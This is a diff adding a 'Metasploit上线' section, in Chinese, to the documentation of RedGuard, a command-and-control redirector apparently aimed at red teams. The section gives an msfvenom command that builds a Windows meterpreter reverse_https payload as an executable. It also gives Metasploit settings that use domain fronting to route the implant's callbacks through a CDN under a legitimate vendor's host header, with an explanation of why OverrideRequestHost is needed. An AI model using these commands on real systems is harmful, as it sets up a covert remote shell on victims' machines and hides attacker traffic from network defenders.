@@ -308,6 +308,33 @@ RedGuard是支持域前置的，在我看来一共有两种展现形式，一种
 
 对于监听器的设置上线端口设置为RedGuard反向代理端口，监听端口为本机实际上线端口。
 
+## Metasploit上线
+
+**生成木马**
+
+```bash
+$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
+-f exe -o ~/path/to/payload.exe
+```
+
+当然作为域前置场景也可以把你的LHOST配置为任意使用该厂商CDN的域名，注意设置HttpHostHeader与RedGuard相符即可。
+
+```bash
+setg OverrideLHOST 360.com
+setg OverrideLPORT 443
+setg OverrideRequestHost true
+```
+
+请务必注意，该`OverrideRequestHost`设置必须设置为`true`。这是由于 Metasploit 在为暂存有效负载生成配置时默认处理传入 HTTP/S 请求的方式的一个怪癖。默认情况下，Metasploit 将传入请求的`Host`标头值（如果存在）用于第二阶段配置，而不是`LHOST`参数。因此，将生成阶段配置，以便将请求直接发送到您的隐藏域名，因为 CloudFront 在转发请求的`Host`标头中传递您的内部域。这显然不是我们所要求的。使用`OverrideRequestHost`配置值，我们可以强制 Metasploit 忽略传入`Host`的标头，而是使用`LHOST`指向原始 CloudFront 域的配置值。
+
+监听器设置为实际上线端口，与RedGuard实际转发到的地址相匹配。
+
+![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)
+
+RedGuard接收到请求：
+
+![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)
+
 # 0x05 Loading
 
 感谢各位用户的支持，RedGuard也会坚持进行完善更新的，希望 RedGuard 能够让更多安全从业者所知，工具参考了RedWarden的设计思想。
